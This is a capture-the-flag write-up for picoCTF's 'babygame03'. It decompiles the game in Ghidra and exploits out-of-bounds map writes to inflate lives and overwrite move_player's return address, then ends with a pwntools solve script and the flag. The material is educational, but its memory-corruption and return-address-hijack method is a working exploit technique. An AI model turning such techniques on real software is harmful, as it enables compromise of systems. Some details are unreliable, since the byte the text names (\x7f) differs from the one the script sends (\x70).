# babygame03

## Method

```
Break the game and get the flag.
Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don't have many moves. There are obstacles that instantly end the game on collision. The game is available to download here. There is no source available, so you'll have to figure your way around the map.
You can connect with it using nc rhea.picoctf.net 50108.
```
**Hint1:** Use 'w','a','s','d' to move around.
**Hint2:** There may be secret commands to make your life easy.

When running this challenge we see it is different from the other 2 challenges as it now limits the number of moves when can make and adds a level mechanism to the game. For each move I am making I am losing 2 lives D:

and when i try to move to the top left there is a ``#`` which causes instant death D: where it says you hit a obstacle. It is no longer allowing me to traverse back from the array into other memory addresses to change the values.

well I know the drill now so my first task is to shove this into ghidra.

first taking a look at main

```c
undefined4 main(void)

{
  int iVar1;
  int local_ab4;
  int local_ab0;
  int local_aac;
  undefined local_aa1 [2700];
  char local_15;
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&local_ab0);
  local_ab4 = 1;
  local_14 = 0;
  init_map(local_aa1,&local_ab0,&local_ab4);
  print_map(local_aa1,&local_ab0,&local_ab4);
  signal(2,sigint_handler);
  do {
    iVar1 = getchar();
    local_15 = (char)iVar1;
    move_player(&local_ab0,(int)local_15,local_aa1,&local_ab4);
    print_map(local_aa1,&local_ab0,&local_ab4);
    if (((local_ab0 == 0x1d) && (local_aac == 0x59)) && (local_ab4 != 4)) {
      puts("You win!\n Next level starting ");
      local_14 = local_14 + 1;
      local_ab4 = local_ab4 + 1;
      init_player(&local_ab0);
      init_map(local_aa1,&local_ab0,&local_ab4);
    }
  } while (((local_ab0 != 0x1d) || (local_aac != 0x59)) || ((local_ab4 != 5 || (local_14 != 4))) );
  win(&local_ab4);
  return 0;
}

```

It looks pretty standard with the levels thing making sure we have not made it to level 4 etc and each time we win it increments our level reinitalising the player and map. When it exits the loop we then check win(&local_ab4)

Looking at the win condition now.

```c
void win(int *param_1)

{
  char local_4c [60];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Please create \'flag.txt\' in this directory with your own debugging flag.");
    fflush(_stdout);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_4c,0x3c,local_10);
  if (*param_1 == 5) {
    printf(local_4c);
    fflush(_stdout);
  }
  return;
}

```
From this we can understand only when parameter passed to win function by is equal to 5 it opens a flag.txt file reads its contents and displays it otherwise nothing is displayed. This means we have to increase the paramter to 5 before even trying to enter this win condition.

Our first possible step is to understand the Main function properly as we need to understand how to get through each level.

```c
undefined4 main(void)
{
  int iVar1;
  int curr_level;      
  player_t player;            
  char map [2700];         
  char move_cmd_input;        
  int local_14;
  undefined *local_10;

  local_10 = &stack0x00000004;
  init_player(&player);
  curr = 1;
  checker = 0;
  init_map(map,&player,&curr);
  print_map(map,&player,&curr);
  signal(2,sigint_handler);
  do {
    iVar1 = getchar();
    move_cmd_input = (char)iVar1;
    move_player(&player, (int)move_cmd_input, map, &curr);
    print_map(map, &player, &curr);
    if (((player.ypos == 0x1d) && (player.xpos == 0x59)) && (curr != 4)) {
      puts("You win!\n Next level starting ");
      checker = checker + 1;
      curr = curr + 1;
      init_player(&player);
      init_map(map,&player,&curr);
    }
    /* GAME WIN CONDITION: player is at {X,Y} = {89, 29} *AND* 
       current level is #5 *AND* local_14 is 4 */
  } while (((player.ypos != 0x1d) || (player.xpos != 0x59)) || 
           ((curr != 5 || (checker != 4))));
  win(&curr);
  return 0;
}

```
Now we get a real idea on how this works..

- Firsly it is impossible to get to the win condition as we only have 50 lives startin at [4][4] and have to move to [89][29] at the cost of 2 lives per movement.
- The win condition makes sure we are on the current level of 5 before passing us the flag.
- there is also a checker variable that checks to see if we are at 4 as it increments by 1 each time we move up a level meaning if we manually overflow the curr level variable it would not matter.

Now we can see 2 glaring issues we deal with later 

1. We cant get past level 4 as it roadblocks us using this condition ``(((player.ypos == 0x1d) && (player.xpos == 0x59)) && (curr != 4))``
2. We cannot manually just exit the loop entering the win condition as it passes a parameter which is the ``curr`` variable which should ideally be 5

Now looking a bit further at our move player condition we can see that it has changed

```c
void move_player(int *param_1,char param_2,int param_3,undefined4 param_4)

{
  int iVar1;
  
  if (param_1[2] < 1) {
    puts("No more lives left. Game over!");
    fflush(_stdout);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (param_2 == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (param_2 == 'p') {
    solve_round(param_3,param_1,param_4);
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = 0x2e;
  if (param_2 == 'w') {
    *param_1 = *param_1 + -1;
  }
  else if (param_2 == 's') {
    *param_1 = *param_1 + 1;
  }
  else if (param_2 == 'a') {
    param_1[1] = param_1[1] + -1;
  }
  else if (param_2 == 'd') {
    param_1[1] = param_1[1] + 1;
  }
  if (*(char *)(*param_1 * 0x5a + param_3 + param_1[1]) == '#') {
    puts("You hit an obstacle!");
    fflush(_stdout);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
  param_1[2] = param_1[2] + -1;
  return;
}
```

The move player this time around has a similar wrap around condition as compared to before this version of move_player() also clears the previous player position by writing a '.' character to clear the player position within the map before the next move instruction.
There is also a restriction on player lives making sure that its above 0 before moving again else it just exits out.


So my first order of buisness would be to first increase the player lives.

Now essentially what holds the number of lives a player has is the original variable int local_aac which is like the first challenge
4 bytes above the map. So essentially we have to underflow it 4 times but wait unlike last time we have to access a item within the address luckily this also seems to be made as an array ``(param_1[2] < 1)`` meaning we can underflow it once more to access the amount of lives contained in this adress. 

```c
 int iVar1;
  int local_ab4;
  int local_ab0;
  int local_aac;
  undefined local_aa1 [2700];
  char local_15;
  int local_14;
  undefined *local_10;
```

However now we know that we cannot hope to possibly traverse from the 0, 0 positionas it will come up as an error as there is a barrier there. As we know this wraps around can't we traverse to this area from different places.

Now when we consider what we did in babygame01 we had essentially traversed to this bit in the map which which i will mark in P
This is essentially where we where when doing the underflow of wwwwaaaa, aaaap which has the array location in bigger picture 
[-1][-4] or [-1][86] 

```
End tile position: 29 89
Player has flag: 64
                                                                                      p
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X

```

But now essentially over here instead of underflowing 4 bytes we need to underflow 5 bytes so realistically woudlnt it be 1 to the left of where we had gone in babygame01?

Trying this we immediately get a large number of lives ;o

```
Player position: 0 85 // 5 underflows at position [0][85]
Level: 1
End tile position: 29 89
Lives left: 26
#....................................................................................@....
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
> w




// now at position [-1][85]
End tile position: 29 89
Lives left: 4194329
#.........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
from here trying to enter p exits the game so we must come back into the playing area then end it to which we can see 

``You win! Next level starting``

From here we just need to do this 3 times to reach level 4 which is essentially having done ``aaaaaaaaawwwwsp`` 3 times taking us to level 4.

Now from level 4 we must make a jump to level 5 ``aaaaaaaaawwwws`` now trying the win condition ``p`` does not work sadly as level 4 introduces two key restrictions that prevent this method from clearing the level. The (curr_level != 4) Check Blocks Progression and This condition prevents progression from level 4 to level 5 by ensuring the level-up logic doesn’t trigger when curr_level is 4. Unlike levels 1-3, where reaching the target position automatically progresses the game, level 4 is a hard stop.

Hence we can use the method of ``babygame02`` to break into this win condition allowing for us to directly increase the ``local_ab4`` variable taking us to level 5.

```
if (((player.ypos == 0x1d) && (player.xpos == 0x59)) && (curr != 4)) {
      puts("You win!\n Next level starting ");
      checker = checker + 1;
      curr = curr + 1;
      init_player(&player);
      init_map(map,&player,&curr);
    }
```

We do this by jumping past the level win condition logic for check and instead into the line where it increments the curr value

We can do this by taking some similar approach to babygame02 where we hijack the return address of the ``move_player()`` function to return to the line where it gives us a win.

So let us first calculate this for the move_player return address using ghidra.

![image](https://github.com/user-attachments/assets/827756a0-3b52-4efc-b434-27867d66b540)

![image](https://github.com/user-attachments/assets/5fb27694-9ede-494a-b30a-d86d529eb92e)

```
EBP 4 bytes
EBX 4 bytes
ECX 4 bytes
^
|
| 2736
|
v
param EDX (EBP - 2732) 4 bytes
param EDX (EBP - 2713) 23 bytes
param EAX (EBP - 2728) 8 bytes
return address(0804992c) 4 bytes
```



All the bytes add upto -51 bytes offset. ``4*3 + 4 + 23 + 8 + 4`` from this we understand we need to offset from the first row 51 times to the left of [0][0] whcih eventually lets our user player end up at the position [0][39].
as we need lives we do the ``aaaaaaaaawwwws`` and as we need to make it go to the 39th array index we can input D 44 times after having done this. 
However doing this makes it wrap going to the next row so we pass w to go up then we need to underflow the lsb of the address of the line of winning which is found here -> and is of the address ``0804997f``

![image](https://github.com/user-attachments/assets/68b7bc90-7f3e-4e50-bad5-717a2214c241)

We can do this by entering``l\x7f`` this changes the lsb of the address. Then we have to pass w again to enter the return condition bypassing level 4 and incrementing us to level 5.

Now that we have incremented our value of the checker and current level to the required ones for printing the flag we can again abuse the return address of move_player and use it to enter the address of the ``win`` function which is -> ``08049afe`` I tried using the ``08`` and the ones prior but it seems as though ``fe`` allows it to faull through the win condition returning us the flag.

![image](https://github.com/user-attachments/assets/879d5d8c-67e2-4d61-af61-0f4d00607355)

Hence I made a script to solve this automatically.
```python
from pwn import *

p = remote("rhea.picoctf.net", 50108)

p.sendline("aaaaaaaaawwwwsp")
p.sendline("aaaaaaaaawwwwsp")  
p.sendline("aaaaaaaaawwwwsp")  
p.sendline("aaaaaaaaawwwws" + ("d" * 44) + "wl\x70w")  
p.sendline("aaaaaaaaawwwws" + ("d" * 28) + "wl\xfew")
           
p.interactive()

```

## Flag

> picoCTF{gamer_leveluP_334c3e00}
